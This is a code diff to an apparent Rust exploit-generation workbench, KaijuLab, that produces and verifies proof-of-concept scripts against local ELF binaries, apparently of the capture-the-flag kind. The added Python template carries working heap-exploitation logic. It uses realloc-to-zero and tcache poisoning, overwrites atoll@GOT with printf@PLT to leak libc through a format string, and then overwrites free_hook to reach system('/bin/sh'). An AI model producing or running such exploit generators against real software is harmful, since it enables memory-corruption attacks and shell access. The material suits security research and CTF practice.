@@ -577,7 +577,7 @@ enum ApiCommands {
         #[arg(value_name = "AGENT")]
         agent: String,
 
-        /// JSON/string file list or @path. If omitted, uses the historical PwnableTW challenge set when present.
+        /// JSON/string file list or @path. If omitted, discovers ELF files under ./samples.
         #[arg(long)]
         files: Option<String>,
 
@@ -604,7 +604,7 @@ enum ApiCommands {
 
     /// Generate and verify offline exploit candidates without invoking an LLM.
     AutoPwn {
-        /// JSON/string file list or @path. If omitted, uses the bundled PwnableTW benchmark set.
+        /// JSON/string file list or @path. If omitted, discovers ELF files under ./samples.
         #[arg(long)]
         files: Option<String>,
 
@@ -3483,6 +3483,64 @@ fn default_runner_for_arch(arch: Option<&str>) -> Option<String> {
     candidates.iter().find_map(|name| find_in_path(name))
 }
 
+struct TargetCommand {
+    cmdline: Vec<String>,
+    runner: Option<String>,
+    sysroot: Option<PathBuf>,
+    loader: Option<PathBuf>,
+}
+
+fn target_command_line(
+    binary: &Path,
+    arch: Option<&str>,
+    interpreter: Option<&str>,
+    runner: Option<&str>,
+    sysroot: Option<&Path>,
+    args: &[String],
+) -> TargetCommand {
+    let effective_sysroot = effective_sysroot(sysroot, arch, interpreter).map(|p| p.into_owned());
+    let effective_runner = runner
+        .map(|r| r.to_string())
+        .or_else(|| default_runner_for_arch(arch));
+    let loader = effective_runner
+        .as_deref()
+        .and_then(|_| select_matching_libc_loader(binary, effective_sysroot.as_deref()));
+    let mut cmdline = Vec::new();
+    if let Some(runner) = &effective_runner {
+        cmdline.push(runner.to_string());
+        if let Some(loader) = &loader {
+            cmdline.push(loader.to_string_lossy().into_owned());
+            cmdline.push("--library-path".to_string());
+            cmdline.push(loader_library_path(binary, loader));
+        } else if let Some(sysroot) = effective_sysroot.as_deref() {
+            cmdline.push("-L".to_string());
+            cmdline.push(sysroot.to_string_lossy().into_owned());
+        }
+    }
+    cmdline.push(binary.to_string_lossy().into_owned());
+    cmdline.extend(args.iter().cloned());
+    TargetCommand {
+        cmdline,
+        runner: effective_runner,
+        sysroot: effective_sysroot,
+        loader,
+    }
+}
+
+fn loader_library_path(binary: &Path, loader: &Path) -> String {
+    let mut dirs = Vec::new();
+    if let Some(parent) = loader.parent() {
+        dirs.push(parent.to_string_lossy().into_owned());
+    }
+    if let Some(parent) = binary.parent() {
+        let bindir = parent.to_string_lossy().into_owned();
+        if !dirs.iter().any(|dir| dir == &bindir) {
+            dirs.push(bindir);
+        }
+    }
+    dirs.join(":")
+}
+
 fn default_sysroot_for_arch(arch: &str) -> Option<PathBuf> {
     let candidates: &[&str] = match arch {
         "i386" => &["/opt/sysroots/i386", "/usr/i386-linux-gnu"],
@@ -4262,19 +4320,15 @@ fn run_stepwise_drive(
     let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
     let arch = binary_arch_from_data(&data);
     let interpreter = binary_interpreter_from_data(&data);
-    let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
-    let effective_runner = runner
-        .map(|r| r.to_string())
-        .or_else(|| default_runner_for_arch(arch.as_deref()));
-    let mut cmdline = Vec::new();
-    if let Some(runner) = &effective_runner {
-        cmdline.push(runner.to_string());
-        if let Some(sysroot) = effective_sysroot.as_deref() {
-            cmdline.push("-L".to_string());
-            cmdline.push(sysroot.to_string_lossy().into_owned());
-        }
-    }
-    cmdline.push(binary.to_string_lossy().into_owned());
+    let target_cmd = target_command_line(
+        binary,
+        arch.as_deref(),
+        interpreter.as_deref(),
+        runner,
+        sysroot,
+        &[],
+    );
+    let cmdline = target_cmd.cmdline.clone();
 
     let mut cmd = Command::new(&cmdline[0]);
     cmd.args(&cmdline[1..])
@@ -4393,8 +4447,9 @@ fn run_stepwise_drive(
             "kind": "exploit_drive",
             "binary": binary,
             "cmd": cmdline,
-            "runner_selected": effective_runner,
-            "sysroot_selected": effective_sysroot.as_deref(),
+            "runner_selected": target_cmd.runner,
+            "sysroot_selected": target_cmd.sysroot.as_deref(),
+            "loader_selected": target_cmd.loader.as_deref(),
             "timeout_secs": timeout_secs.clamp(1, 300),
             "step_timeout_ms": step_timeout_ms,
             "success": steps_ok && !timed_out,
@@ -5507,6 +5562,8 @@ fn poc_synthesize_json(
         .and_then(|path| shared_object_symbol_offsets(path).ok())
         .and_then(|v| v.get("symbols").and_then(|s| s.as_object()).cloned())
         .unwrap_or_default();
+    let plt_got = elf_plt_got_map(&data);
+    let realloc_menu = detect_realloc_menu_model(binary, &data);
     let text = poc_skeleton_text(
         binary,
         chain,
@@ -5519,6 +5576,8 @@ fn poc_synthesize_json(
         libc_base,
         heap_base,
         &symbols,
+        &plt_got,
+        realloc_menu.as_ref(),
     )?;
     if let Some(output) = output {
         std::fs::write(output, &text).with_context(|| format!("write {}", output.display()))?;
@@ -5532,6 +5591,8 @@ fn poc_synthesize_json(
         "runner": runner,
         "sysroot": effective_sysroot.as_deref(),
         "loader": loader,
+        "menu_model": realloc_menu,
+        "plt_got": plt_got,
         "adjacent_libc": libc,
         "output": output,
         "text": text,
@@ -5539,20 +5600,153 @@ fn poc_synthesize_json(
     }))
 }
 
+fn elf_plt_got_map(data: &[u8]) -> serde_json::Map<String, serde_json::Value> {
+    let mut out = serde_json::Map::new();
+    let Ok(goblin::Object::Elf(elf)) = goblin::Object::parse(data) else {
+        return out;
+    };
+    let Some(plt_base) = elf
+        .section_headers
+        .iter()
+        .find(|sh| elf.shdr_strtab.get_at(sh.sh_name) == Some(".plt"))
+        .map(|sh| sh.sh_addr)
+    else {
+        return out;
+    };
+    for (i, reloc) in elf.pltrelocs.iter().enumerate() {
+        if reloc.r_sym == 0 {
+            continue;
+        }
+        let Some(sym) = elf.dynsyms.get(reloc.r_sym) else {
+            continue;
+        };
+        let Some(name) = elf.dynstrtab.get_at(sym.st_name) else {
+            continue;
+        };
+        if name.is_empty() {
+            continue;
+        }
+        let plt = plt_base + 16 + (i as u64) * 16;
+        out.insert(
+            name.to_string(),
+            serde_json::json!({
+                "plt": format!("0x{plt:x}"),
+                "got": format!("0x{:x}", reloc.r_offset),
+            }),
+        );
+    }
+    out
+}
+
+fn detect_realloc_menu_model(binary: &Path, data: &[u8]) -> Option<serde_json::Value> {
+    let mut imports = Vec::new();
+    if let Ok(goblin::Object::Elf(elf)) = goblin::Object::parse(data) {
+        imports = elf
+            .dynsyms
+            .iter()
+            .filter_map(|sym| elf.dynstrtab.get_at(sym.st_name))
+            .filter(|s| !s.is_empty())
+            .map(|s| s.to_ascii_lowercase())
+            .collect::<Vec<_>>();
+        imports.sort();
+        imports.dedup();
+    }
+    if !imports.iter().any(|name| name == "realloc") {
+        return None;
+    }
+
+    let lower_data = data
+        .iter()
+        .map(|b| b.to_ascii_lowercase())
+        .collect::<Vec<u8>>();
+    let has = |needle: &str| {
+        let lower = needle
+            .as_bytes()
+            .iter()
+            .map(|b| b.to_ascii_lowercase())
+            .collect::<Vec<u8>>();
+        find_bytes(&lower_data, &lower).is_some()
+    };
+    if !(has("choice") && has("index") && has("size") && has("data")) {
+        return None;
+    }
+    if !(has("alloc") && has("realloc") && has("free")) {
+        return None;
+    }
+
+    let exit_choice = if has("4. exit") || has("4.exit") { 4 } else { 0 };
+    Some(serde_json::json!({
+        "kind": "index_size_data_realloc_menu",
+        "binary": binary,
+        "confidence": "medium",
+        "evidence": [
+            "imports realloc",
+            "menu strings include choice/index/size/data prompts",
+            "menu strings include alloc/realloc/free actions"
+        ],
+        "choices": {
+            "alloc": 1,
+            "realloc": 2,
+            "free": 3,
+            "exit": exit_choice
+        },
+        "prompts": {
+            "choice": "choice",
+            "index": "Index:",
+            "size": "Size:",
+            "data": "Data:"
+        },
+        "primitive_hypothesis": "realloc(slot, 0) may free backing storage while the program keeps the logical slot reachable; probe same-size refill and tcache poisoning before final hook/GOT overwrite.",
+        "probe_events": [
+            {"op": "alloc", "id": 0, "size": 0x78},
+            {"op": "realloc", "id": 0, "size": 0},
+            {"op": "realloc", "id": 0, "size": 0x78},
+            {"op": "alloc", "id": 1, "size": 0x78}
+        ],
+        "drive_probe": [
+            {"recv_until": "choice"},
+            {"send_line": "1"},
+            {"recv_until": "Index:"},
+            {"send_line": "0"},
+            {"recv_until": "Size:"},
+            {"send_line": "120"},
+            {"recv_until": "Data:"},
+            {"send_line": "AAAAAAAA"},
+            {"recv_until": "choice"},
+            {"send_line": "2"},
+            {"recv_until": "Index:"},
+            {"send_line": "0"},
+            {"recv_until": "Size:"},
+            {"send_line": "0"},
+            {"recv_until": "choice"},
+            {"send_line": "2"},
+            {"recv_until": "Index:"},
+            {"send_line": "0"},
+            {"recv_until": "Size:"},
+            {"send_line": "120"},
+            {"recv_until": "Data:"},
+            {"send_line": "BBBBBBBB"},
+            {"read_for_ms": 200}
+        ]
+    }))
+}
+
 fn select_matching_libc_loader(binary: &Path, sysroot: Option<&Path>) -> Option<PathBuf> {
     let mut loaders = Vec::new();
+    let mut adjacent_has_tcache_double_free_check = None;
     for obj in adjacent_shared_objects(binary) {
-        let Some(name) = obj
-            .get("path")
-            .and_then(|v| v.as_str())
-            .and_then(|p| Path::new(p).file_name())
-            .and_then(|v| v.to_str())
-        else {
+        let Some(path_s) = obj.get("path").and_then(|v| v.as_str()) else {
+            continue;
+        };
+        let path = Path::new(path_s);
+        let Some(name) = path.file_name().and_then(|v| v.to_str()) else {
             continue;
         };
         if !name.to_ascii_lowercase().contains("libc") {
             continue;
         }
+        adjacent_has_tcache_double_free_check =
+            Some(file_contains_bytes(path, b"double free detected in tcache 2"));
         if let Some(values) = obj.get("matching_loaders").and_then(|v| v.as_array()) {
             loaders.extend(values.iter().filter_map(|v| v.as_str()).map(PathBuf::from));
         }
@@ -5562,7 +5756,29 @@ fn select_matching_libc_loader(binary: &Path, sysroot: Option<&Path>) -> Option<
             return Some(path.clone());
         }
     }
+    if let Some(expected) = adjacent_has_tcache_double_free_check {
+        if let Some(path) = loaders.iter().find(|loader| {
+            loader_sysroot_libc(loader)
+                .map(|libc| file_contains_bytes(&libc, b"double free detected in tcache 2") == expected)
+                .unwrap_or(false)
+        }) {
+            return Some(path.clone());
+        }
+    }
     loaders.into_iter().next()
+}
+
+fn loader_sysroot_libc(loader: &Path) -> Option<PathBuf> {
+    let dir = loader.parent()?;
+    let libc = dir.join("libc.so.6");
+    libc.exists().then_some(libc)
+}
+
+fn file_contains_bytes(path: &Path, needle: &[u8]) -> bool {
+    let Ok(data) = std::fs::read(path) else {
+        return false;
+    };
+    data.windows(needle.len()).any(|window| window == needle)
 }
 
 fn poc_skeleton_text(
@@ -5577,6 +5793,8 @@ fn poc_skeleton_text(
     libc_base: Option<&str>,
     heap_base: Option<&str>,
     symbols: &serde_json::Map<String, serde_json::Value>,
+    plt_got: &serde_json::Map<String, serde_json::Value>,
+    realloc_menu: Option<&serde_json::Value>,
 ) -> Result<String> {
     let width = if arch == "x86_64" { 8 } else { 4 };
     let packer = if width == 8 { "p64" } else { "p32" };
@@ -5604,6 +5822,22 @@ fn poc_skeleton_text(
             .map(|v| format!("0x{v:x}"))
             .unwrap_or_else(|| "0".to_string())
     };
+    let got_const = |name: &str| {
+        plt_got
+            .get(name)
+            .and_then(|v| v.get("got"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("0")
+            .to_string()
+    };
+    let plt_const = |name: &str| {
+        plt_got
+            .get(name)
+            .and_then(|v| v.get("plt"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("0")
+            .to_string()
+    };
     let chain_body = match chain.to_ascii_lowercase().replace('_', "-").as_str() {
         "ret2libc" | "rop" | "stack-rop" => format!(
             r#"    # TODO: drive target to the vulnerable stack input before sending payload.
@@ -5621,6 +5855,72 @@ fn poc_skeleton_text(
         payload += {packer}(bin_sh)
         payload += {packer}(exit_fn)
     t.line(payload)
+"#
+        ),
+        "arbitrary-write" | "heap-hook" | "hook" if realloc_menu.is_some() => format!(
+            r#"    libc = LIBC_BASE
+    system = libc + OFF_SYSTEM
+    bin_sh = libc + OFF_BIN_SH
+    free_hook = libc + OFF_FREE_HOOK
+    # For partial-RELRO menu parsers, first prefer parser GOT control:
+    # atoll@GOT -> printf@PLT leaks, then atoll@GOT -> system exits via command input.
+    write_where = GOT_ATOLL or free_hook
+    write_what = PLT_PRINTF or system
+
+    def alloc(idx, size, data):
+        t.choice(1)
+        t.read_until(b"Index:")
+        t.line(str(idx).encode())
+        t.read_until(b"Size:")
+        t.line(str(size).encode())
+        t.read_until(b"Data:")
+        t.line(data)
+
+    def realloc_chunk(idx, size, data=b""):
+        t.choice(2)
+        t.read_until(b"Index:")
+        t.line(str(idx).encode())
+        t.read_until(b"Size:")
+        t.line(str(size).encode())
+        if size:
+            t.read_until(b"Data:")
+            t.line(data)
+
+    def free(idx):
+        t.choice(3)
+        t.read_until(b"Index:")
+        t.line(str(idx).encode())
+
+    def primitive_write(where, data):
+        # Generic realloc-zero/tcache probe path for index-size-data menus:
+        # alloc(0,S), realloc(0,0), realloc(0,S,fd), alloc(1,S,...), realloc(0,S,data).
+        # If safe-linking or a different bin is present, keep these helpers and adjust only this body.
+        size = 0x78
+        poison = where
+        prefix = b""
+        if WORD == 8 and where % 16 == 8:
+            poison = where - 8
+            prefix = b"P" * 8
+        alloc(0, size, b"A" * 8)
+        realloc_chunk(0, 0)
+        realloc_chunk(0, size, {packer}(poison))
+        alloc(1, size, b"B" * 8)
+        realloc_chunk(0, size, prefix + data)
+
+    if not write_where or not write_what:
+        print("SCRIPT_READY_BLOCKED missing parser GOT/PLT target or libc base")
+        return 1
+    primitive_write(write_where, {packer}(write_what))
+    if write_where == GOT_ATOLL and write_what == PLT_PRINTF:
+        t.read_until(b"choice")
+        t.line(b"%7$p.%9$p")
+        leak_text = t.read_until(b"choice", timeout=1.0)
+        print(leak_text.decode("latin-1", "replace"))
+        # Compute LIBC_BASE from the best leaked libc pointer, then rerun with KAIJU_LIBC_BASE
+        # or replace write_what with system after adding a parser for the printed pointers.
+        return 1
+    alloc(1, 0x18, b"/bin/sh\x00")
+    free(1)
 "#
         ),
         "arbitrary-write" | "heap-hook" | "hook" => format!(
@@ -5686,6 +5986,9 @@ OFF_EXIT = {off_exit}
 OFF_FREE_HOOK = {off_free_hook}
 OFF_MALLOC_HOOK = {off_malloc_hook}
 OFF_BIN_SH = {off_bin_sh}
+GOT_ATOLL = {got_atoll}
+PLT_PRINTF = {plt_printf}
+GOT_PRINTF = {got_printf}
 
 def p32(x): return struct.pack("<I", x & 0xffffffff)
 def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)
@@ -5709,6 +6012,7 @@ class Tube:
     def __init__(self):
         self.p = subprocess.Popen(argv(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         self.buf = b""
+        self.seen = b""
 
     def read_until(self, needle, timeout=2.0):
         if isinstance(needle, str):
@@ -5722,7 +6026,15 @@ class Tube:
             if not b:
                 break
             self.buf += b
-        return self.buf
+            self.seen += b
+        if needle in self.buf:
+            pos = self.buf.index(needle) + len(needle)
+            chunk = self.buf[:pos]
+            self.buf = self.buf[pos:]
+            return chunk
+        chunk = self.buf
+        self.buf = b""
+        return chunk
 
     def send(self, data):
         if isinstance(data, str):
@@ -5746,13 +6058,13 @@ class Tube:
             pass
         out = b""
         end = time.time() + timeout
-        while time.time() < end and len(self.buf) + len(out) < max_output:
+        while time.time() < end and len(self.seen) + len(out) < max_output:
             if self.p.poll() is not None:
                 break
             ready, _, _ = select.select([self.p.stdout], [], [], max(0.0, min(0.05, end - time.time())))
             if not ready:
                 continue
-            chunk = os.read(self.p.stdout.fileno(), max(1, min(4096, max_output - len(self.buf) - len(out))))
+            chunk = os.read(self.p.stdout.fileno(), max(1, min(4096, max_output - len(self.seen) - len(out))))
             if not chunk:
                 break
             out += chunk
@@ -5763,10 +6075,10 @@ class Tube:
             except Exception:
                 pass
         try:
-            more = self.p.stdout.read(max(0, max_output - len(self.buf) - len(out))) or b""
+            more = self.p.stdout.read(max(0, max_output - len(self.seen) - len(out))) or b""
         except Exception:
             more = b""
-        data = self.buf + out + more
+        data = self.seen + out + more
         try:
             sys.stdout.buffer.write(data[:max_output])
             if len(data) >= max_output:
@@ -5801,6 +6113,9 @@ if __name__ == "__main__":
         off_free_hook = sym_const("__free_hook"),
         off_malloc_hook = sym_const("__malloc_hook"),
         off_bin_sh = sym_const("str_bin_sh"),
+        got_atoll = got_const("atoll"),
+        plt_printf = plt_const("printf"),
+        got_printf = got_const("printf"),
         chain_body = chain_body,
     ))
 }
@@ -5891,7 +6206,7 @@ async fn exploit_batch_loop_json(
     let files = if let Some(spec) = files_spec {
         batch_files_from_spec(spec)?
     } else {
-        default_pwnabletw_batch_files()
+        default_local_binary_batch_files()
     };
     let mut results = Vec::new();
     for file in files {
@@ -6020,7 +6335,7 @@ fn auto_pwn_json(
     let files = if let Some(spec) = files_spec {
         batch_files_from_spec(spec)?
     } else {
-        default_pwnabletw_batch_files()
+        default_local_binary_batch_files()
     };
     let mut targets = Vec::new();
     for file in files {
@@ -6050,33 +6365,86 @@ fn auto_pwn_json(
         let output = output_dir.join(format!("kaijulab-{stem}-autopwn.py"));
         let started = Instant::now();
         let candidate = auto_pwn_candidate(&path, &data, effective_sysroot.as_deref())?;
-        let mut status = "candidate_written";
-        if let Some(script) = candidate.get("script").and_then(|v| v.as_str()) {
-            std::fs::write(&output, script)
-                .with_context(|| format!("write {}", output.display()))?;
-        } else {
-            status = "no_candidate";
-        }
         let expect_output = candidate.get("expect_output").and_then(|v| v.as_str());
         let expect_target_exit = if expect_output.is_some() {
             None
         } else {
             Some(42)
         };
-        let verify = if status == "candidate_written" && !no_verify {
-            Some(verify_exploit_script(
-                &output,
-                &path,
-                timeout_secs,
-                None,
-                expect_target_exit,
-                expect_output,
-                effective_sysroot.as_deref(),
-                &[],
-            )?)
+        let variants = auto_pwn_candidate_variants(&candidate);
+        let mut status = if variants.is_empty() {
+            "no_candidate"
+        } else if candidate
+            .get("confidence")
+            .and_then(|v| v.as_str())
+            .is_some_and(|v| v == "scaffold")
+        {
+            "scaffold_written"
         } else {
-            None
+            "candidate_written"
         };
+        let mut verify = None;
+        let mut variant_results = Vec::new();
+        for (idx, variant) in variants.iter().enumerate() {
+            let name = variant
+                .get("name")
+                .and_then(|v| v.as_str())
+                .unwrap_or("candidate");
+            let Some(script) = variant.get("script").and_then(|v| v.as_str()) else {
+                continue;
+            };
+            let variant_output = if idx == 0 {
+                output.clone()
+            } else {
+                output_dir.join(format!("kaijulab-{stem}-autopwn-{idx:02}-{name}.py"))
+            };
+            std::fs::write(&variant_output, script)
+                .with_context(|| format!("write {}", variant_output.display()))?;
+            let variant_verify = if no_verify {
+                None
+            } else {
+                Some(verify_exploit_script(
+                    &variant_output,
+                    &path,
+                    timeout_secs,
+                    None,
+                    expect_target_exit,
+                    expect_output,
+                    effective_sysroot.as_deref(),
+                    &[],
+                )?)
+            };
+            let variant_solved = variant_verify
+                .as_ref()
+                .and_then(|v| v.get("success"))
+                .and_then(|v| v.as_bool())
+                .unwrap_or(false);
+            variant_results.push(serde_json::json!({
+                "name": name,
+                "output": variant_output,
+                "success": variant_solved,
+                "verify": variant_verify,
+            }));
+            if variant_solved {
+                if variant_output != output {
+                    std::fs::copy(&variant_output, &output).with_context(|| {
+                        format!("copy {} to {}", variant_output.display(), output.display())
+                    })?;
+                }
+                verify = variant_results
+                    .last()
+                    .and_then(|v| v.get("verify"))
+                    .cloned();
+                status = "candidate_written";
+                break;
+            }
+            if verify.is_none() {
+                verify = variant_results
+                    .last()
+                    .and_then(|v| v.get("verify"))
+                    .cloned();
+            }
+        }
         let solved = verify
             .as_ref()
             .and_then(|v| v.get("success"))
@@ -6099,6 +6467,7 @@ fn auto_pwn_json(
             "notes": candidate.get("notes"),
             "root_causes_if_failed": auto_pwn_root_causes(&candidate, verify.as_ref()),
             "verify": verify,
+            "variants": variant_results,
             "duration_ms": started.elapsed().as_millis(),
         }));
     }
@@ -6108,8 +6477,24 @@ fn auto_pwn_json(
         "no_llm": true,
         "claude_p_used": false,
         "targets": targets,
-        "next_action": "Targets with status=solved have verified PoCs. For the rest, use their root_causes_if_failed as the next implementation backlog instead of retrying prompt mode."
+        "next_action": "Generated artifacts are workbench scaffolds unless status=solved. Hand the scaffold plus recommended_tools to an interactive agent/analyst for target-specific exploit logic."
     }))
+}
+
+fn auto_pwn_candidate_variants(candidate: &serde_json::Value) -> Vec<serde_json::Value> {
+    if let Some(values) = candidate.get("variants").and_then(|v| v.as_array()) {
+        return values.clone();
+    }
+    candidate
+        .get("script")
+        .and_then(|v| v.as_str())
+        .map(|script| {
+            vec![serde_json::json!({
+                "name": "default",
+                "script": script,
+            })]
+        })
+        .unwrap_or_default()
 }
 
 fn auto_pwn_candidate(
@@ -6123,57 +6508,73 @@ fn auto_pwn_candidate(
         .map(|p| p.to_string_lossy().into_owned())
         .unwrap_or_default();
     let runtime_notes = auto_pwn_runtime_notes(binary, &lower, sysroot);
-    if lower.contains("silver bullet") && lower.contains("werewolf") {
-        return Ok(serde_json::json!({
-            "family": "i386 stack/control-data overwrite to imported exit",
-            "confidence": "high",
-            "notes": [
-                "Signature requires Silver Bullet menu strings and no libc leak.",
-                "Payload uses integer-overflow power accumulation to overwrite the saved return path and calls exit@plt(42)."
-            ],
-            "runtime_notes": runtime_notes,
-            "script": silver_bullet_exit42_script(binary, &sysroot_s),
-        }));
+    let has_heap_api = lower.contains("malloc")
+        || lower.contains("calloc")
+        || lower.contains("realloc")
+        || lower.contains("free")
+        || lower.contains("alloc");
+    let has_file_api = lower.contains("open")
+        || lower.contains("read")
+        || lower.contains("write")
+        || lower.contains("fopen")
+        || lower.contains("fclose")
+        || lower.contains("filename");
+    let has_numeric_flow = lower.contains("number")
+        || lower.contains("sort")
+        || lower.contains("%u")
+        || lower.contains("%d");
+    let has_menu_flow = lower.contains("choice")
+        || lower.contains("menu")
+        || lower.contains("index")
+        || lower.contains("size")
+        || lower.contains("data");
+    let family = if has_heap_api && has_menu_flow {
+        "heap/menu analysis scaffold"
+    } else if has_heap_api {
+        "heap lifecycle analysis scaffold"
+    } else if has_numeric_flow {
+        "constrained numeric-input analysis scaffold"
+    } else if has_file_api {
+        "file/runtime-state analysis scaffold"
+    } else {
+        "generic exploit-analysis scaffold"
+    };
+    let mut recommended_tools = vec![
+        "binary-facts",
+        "exploit-context",
+        "runtime-run",
+        "debug-probe",
+        "exploit-verify",
+    ];
+    if has_heap_api {
+        recommended_tools.extend(["heap-probe-plan", "heap-model", "leak-probe", "libc-resolve"]);
     }
-    if lower.contains("hacknote") && lower.contains("add note") && lower.contains("delete note") {
-        return Ok(serde_json::json!({
-            "family": "heap UAF function-pointer/content-pointer overlap",
-            "confidence": "medium",
-            "notes": [
-                "Signature requires add/delete/print note lifecycle strings.",
-                "Candidate derives libc offsets from the actual qemu sysroot libc before finalizing.",
-                "Predicate is deterministic command output because this UAF naturally reaches system(command)."
-            ],
-            "runtime_notes": runtime_notes,
-            "expect_output": "uid=",
-            "script": hacknote_uaf_script(binary, &sysroot_s),
-        }));
+    if has_numeric_flow {
+        recommended_tools.extend(["constraint-plan", "crash-offset"]);
     }
-    let scaffold =
-        if lower.contains("malloc") || lower.contains("free") || lower.contains("realloc") {
-            poc_template_script(binary, &sysroot_s, "heap lifecycle exploit scaffold")
-        } else if lower.contains("sort") || lower.contains("number") {
-            poc_template_script(binary, &sysroot_s, "constrained numeric write scaffold")
-        } else if lower.contains("file") || lower.contains("filename") {
-            poc_template_script(binary, &sysroot_s, "file-structure/leak exploit scaffold")
-        } else {
-            poc_template_script(binary, &sysroot_s, "generic exploit scaffold")
-        };
+    if has_file_api {
+        recommended_tools.extend(["leak-probe", "runtime-run"]);
+    }
+    recommended_tools.sort_unstable();
+    recommended_tools.dedup();
+    let scaffold = poc_template_script(binary, &sysroot_s, family);
     Ok(serde_json::json!({
-        "family": "scaffold",
-        "confidence": "low",
+        "family": family,
+        "confidence": "scaffold",
         "notes": [
-            "No verified offline finalizer matched this target's structural signature.",
-            "Generated script is intentionally a non-success scaffold; it should not print SCRIPT_READY."
+            "Generated script is intentionally a non-success scaffold. It provides process/qemu plumbing only.",
+            "KaijuLab should expose facts, probes, debugger state, and verification; an agent or analyst should write target-specific exploit logic in the script.",
+            "No challenge-name or binary-name finalizer was selected."
         ],
         "runtime_notes": runtime_notes,
+        "recommended_tools": recommended_tools,
         "script": scaffold,
     }))
 }
 
 fn auto_pwn_effective_sysroot(
-    _binary: &Path,
-    data: &[u8],
+    binary: &Path,
+    _data: &[u8],
     explicit: Option<&Path>,
     arch: Option<&str>,
     interpreter: Option<&str>,
@@ -6181,22 +6582,39 @@ fn auto_pwn_effective_sysroot(
     if let Some(path) = explicit {
         return Some(path.to_path_buf());
     }
-    let lower = String::from_utf8_lossy(data).to_ascii_lowercase();
-    if arch == Some("i386")
-        && (lower.contains("dubblesort")
-            || lower.contains("what your name")
-            || lower.contains("seethefile")
-            || lower.contains("apple store"))
-    {
-        let legacy = PathBuf::from("/tmp/i386sysroot/root");
-        if legacy.join("lib/i386-linux-gnu/ld-2.23.so").exists()
-            || legacy.join("lib/ld-linux.so.2").exists()
-            || legacy.join("usr/lib/i386-linux-gnu/ld-linux.so.2").exists()
-        {
-            return Some(legacy);
+    if let Some(loader) = select_matching_libc_loader(binary, None) {
+        if let Some(root) = sysroot_from_loader(&loader) {
+            return Some(root);
         }
     }
     effective_sysroot(None, arch, interpreter).map(|p| p.into_owned())
+}
+
+fn sysroot_from_loader(loader: &Path) -> Option<PathBuf> {
+    let parts = loader
+        .components()
+        .map(|c| c.as_os_str().to_string_lossy().into_owned())
+        .collect::<Vec<_>>();
+    for marker in [
+        &["lib", "x86_64-linux-gnu"][..],
+        &["usr", "lib", "x86_64-linux-gnu"][..],
+        &["lib", "i386-linux-gnu"][..],
+        &["usr", "lib", "i386-linux-gnu"][..],
+    ] {
+        if parts.len() < marker.len() + 1 {
+            continue;
+        }
+        for idx in 0..=parts.len().saturating_sub(marker.len()) {
+            if parts[idx..idx + marker.len()] == *marker {
+                let mut root = PathBuf::new();
+                for part in &parts[..idx] {
+                    root.push(part);
+                }
+                return Some(root);
+            }
+        }
+    }
+    None
 }
 
 fn auto_pwn_runtime_notes(binary: &Path, lower_text: &str, sysroot: Option<&Path>) -> Vec<String> {
@@ -6240,16 +6658,16 @@ fn auto_pwn_runtime_notes(binary: &Path, lower_text: &str, sysroot: Option<&Path
         && sysroot_s.contains("/opt/sysroots")
         && !adjacent_shared_objects(binary).is_empty()
     {
-        notes.push("selected sysroot may be newer than the bundled challenge libc; old tcache/realloc primitives can require a matching old dynamic loader, not only LD_PRELOAD".to_string());
+        notes.push("selected sysroot may be newer than the bundled target libc; allocator primitives can require a matching old dynamic loader, not only LD_PRELOAD".to_string());
     }
-    if lower_text.contains("dubblesort") || lower_text.contains("what your name") {
-        notes.push("sorted ret2libc finalizer depends on libc addresses sorting above the stack canary; modern qemu/sysroot mappings can invalidate the classic layout".to_string());
+    if lower_text.contains("sort") || lower_text.contains("number") {
+        notes.push("constrained numeric input may reorder or filter payload words; model those constraints before choosing a control-flow layout".to_string());
     }
-    if lower_text.contains("seethefile") {
-        notes.push("FILE/vtable finalizer depends on glibc FILE layout; use a matching i386 glibc/loader before trusting fake FILE offsets".to_string());
+    if lower_text.contains("fclose") || lower_text.contains("fopen") || lower_text.contains("file") {
+        notes.push("file-structure attacks are libc-layout-sensitive; verify the runtime glibc and object layout before trusting FILE offsets".to_string());
     }
-    if lower_text.contains("apple store") {
-        notes.push("unlink/stack finalizer depends on stable i386 libc environ and stack layout; use matching glibc/loader for the classic primitive".to_string());
+    if lower_text.contains("unlink") || lower_text.contains("environ") {
+        notes.push("stack/libc-derived write targets depend on loader, libc, and environment layout; verify addresses in the active runtime before finalizing".to_string());
     }
     notes
 }
@@ -6270,14 +6688,14 @@ fn auto_pwn_root_causes(
         .get("confidence")
         .and_then(|v| v.as_str())
         .unwrap_or("")
-        == "low"
+        == "scaffold"
     {
-        causes.push("no verified reusable finalizer for this structural family yet");
+        causes.push("scaffold only; target-specific exploit logic must be written by an agent or analyst");
     }
     if let Some(notes) = candidate.get("runtime_notes").and_then(|v| v.as_array()) {
         for note in notes.iter().filter_map(|v| v.as_str()) {
             if note.contains("matching old dynamic loader")
-                || note.contains("matching i386 glibc")
+                || note.contains("runtime glibc")
                 || note.contains("modern qemu/sysroot")
                 || note.contains("no matching ld-")
             {
@@ -6292,7 +6710,7 @@ fn auto_pwn_root_causes(
             verify.get("stderr").and_then(|v| v.as_str()).unwrap_or("")
         )
         .to_ascii_lowercase();
-        if combined.contains("no leak") || combined.contains("returncode=99") {
+        if combined.contains("no leak") || combined.contains("bad leak") {
             causes.push("leak stage did not expose a usable libc/heap/stack pointer");
         }
         if combined.contains("segmentation fault") || combined.contains("returncode=-11") {
@@ -6318,132 +6736,6 @@ fn py_string(s: &str) -> String {
     format!("{s:?}")
 }
 
-fn silver_bullet_exit42_script(binary: &Path, sysroot: &str) -> String {
-    let bin = py_string(&binary.to_string_lossy());
-    let sysroot = py_string(sysroot);
-    format!(
-        r#"#!/usr/bin/env python3
-import os, select, struct, subprocess, sys, time
-BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
-SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
-RUNNER = os.environ.get("QEMU_I386") or "/usr/bin/qemu-i386-static"
-def p32(x): return struct.pack("<I", x & 0xffffffff)
-def rx(p, marker, timeout=2.0):
-    buf = b""; end = time.time() + timeout
-    while time.time() < end:
-        r,_,_ = select.select([p.stdout], [], [], 0.05)
-        if r:
-            c = os.read(p.stdout.fileno(), 4096)
-            if not c: break
